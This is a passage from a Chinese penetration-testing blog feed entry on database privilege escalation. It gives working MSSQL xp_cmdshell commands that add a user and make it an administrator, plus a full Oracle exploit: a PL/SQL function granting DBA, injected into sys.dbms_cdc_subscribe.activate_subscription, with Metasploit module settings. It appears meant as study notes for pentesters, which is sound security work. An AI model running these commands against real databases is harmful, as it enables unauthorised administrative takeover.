class="string">'xp_cmdshell'</span>, 0;reconfigure</span><br></pre></td></tr></table></figure><h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">'net user test pinohd123. /add'</span>    添加用户<span class="built_in">test</span>，密码<span class="built_in">test</span></span><br><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">'net localgroup administrators test add'</span>    添加<span class="built_in">test</span>用户到管理员组</span><br></pre></td></tr></table></figure><h3 id="Oracle数据库提权之注入存储过程提权"><a href="#Oracle数据库提权之注入存储过程提权" class="headerlink" title="Oracle数据库提权之注入存储过程提权"></a>Oracle数据库提权之注入存储过程提权</h3><h4 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h4><p>SYS创建的存储过程存在sql注入。拥有<code>create procedure</code>权限的用户通过创建提权函数，将提权函数注入到存储过程中，于是该存储过程将调用这个提权函数来执行<code>grant dba to quan</code>命令，获得<strong>Oracle数据库dba权限</strong>。</p><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>SYS创建的存储过程<code>存在sql注入</code>（EG：CVE-2005-4832）</li><li>用户拥有<code>create procedure</code>权限（用来创建函数）</li></ul><h4 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h4><p>假设有一个用户quan 只有 CONNECT 和 RESOURCE 权限</p><h5 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h5><ul><li>用户登陆后执行<code>select * from session_privs</code>查看权限</li><li>创建函数，命令为<code>grant dba to quan</code></li></ul><p>grant execute on pwn to public;//赋予所有用户此函数的执行权限</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span>&gt;<span class="keyword">create</span> <span class="keyword">or replace</span> <span class="keyword">function</span> pwn <span class="keyword">return</span> vaarchar2</span><br><span class="line">authid <span class="built_in">current_user</span> <span class="keyword">is</span> pragma autonomous_transaction;</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">execute</span> <span class="keyword">immediate</span> <span class="string">'grant dba to quan'</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span>&gt;<span class="keyword">grant</span> <span class="keyword">execute</span> <span class="keyword">on</span> pwn <span class="keyword">to</span> <span class="built_in">public</span>;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>注入sys.dbms_cdc_subscribe.activate_subscription</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt;begin</span><br><span class="line">sys.dbms_cdc_subscribe.activate_subscription(<span class="string">'''||quan.pwn()||'''</span>);</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">SQL&gt;set role dba;</span><br></pre></td></tr></table></figure><p>执行<code>select * from session_privs</code>查看是否为dba权限</p><h5 id="利用MSF注入"><a href="#利用MSF注入" class="headerlink" title="利用MSF注入"></a>利用MSF注入</h5><p>1.加载攻击模块</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> auxiliary/sqli/<span class="keyword">oracle</span>/dbms_cdc_subscribe.activate_subscription</span><br></pre></td></tr></table></figure><p>2.配置参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> dbuser quan</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> dbpass quan123</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> sid orcl</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> rhost xxxxx</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> sql grant dba <span class="keyword">to</span> quan</span><br></pre></td></tr></table></figure><p>3.run</p><h3 id="Oracle数据库提权之通过utl-http-request存储过程提权"><a href="#Oracle数据库提权之通过utl-http-request存储过程提权" class="headerlink" title="Oracle数据库提权之通过utl_http.request存储过程提权"></a>Oracle数据库提权之通过utl_http.request存储过程提权</h3><h4 id="原理分析-2"><a href="#原理分析-2" class="headerlink" title="原理分析"></a>原理分析</h4><p>Oracle9i~11gR2中<code>dbms_xmlquery.newcontext()</code>和<code>dbms_xmlquery.getxml()</code>函数可以执行任意PL/SQL语句，利用这两个函数可以获得Oracle服务器的<strong>操作系统权限</strong>。</p><h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>UTL_HTTP存储过程可用</li><li>Oracle9i~11gR2</li></ul><h4 id="提权步骤-1"><a href="#提权步骤-1" class="headerlink" title="提权步骤"></a>提权步骤</h4><ol><li>创建Java包</li><li>创建存储过程MYJAVACMD</li><li>执行存储过程，成功添加用户</li></ol><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.cnblogs.com/0nc3/p/12081189.html" target="_blank" rel="noopener">https://www.cnblogs.com/0nc3/p/12081189.html</a></p><p><a href="https://www.webshell.cc/4790.html" target="_blank" rel="noopener">https://www.webshell.cc/4790.html</a></p><p><a href="https://xz.aliyun.com/t/2719" target="_blank" rel="noopener">https://xz.aliyun.com/t/2719</a></p><p><a href="https://blog.csdn.net/qq_26090065/article/details/81515355" target="_blank" rel="noopener">https://blog.csdn.net/qq_26090065/article/details/81515355</a></p><p><a href="https://xz.aliyun.com/t/7392#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/7392#toc-10</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;渗透测试中常见提权方式总结（二）&quot;&gt;&lt;a href=&quot;#渗透测试中常见提权方式总结（二）&quot; class=&quot;headerlink&quot; title=&quot;渗透测试中常见提权方式总结（二）&quot;&gt;&lt;/a&gt;渗透测试中常见提权方式总结（二）&lt;/h2&gt;&lt;h3 id=&quot;数据库提权&quot;&gt;&lt;a
      
    
    </summary>
    
    
      <category term="渗透测试学习" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="提权" scheme="https://shu1l.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
</feed>
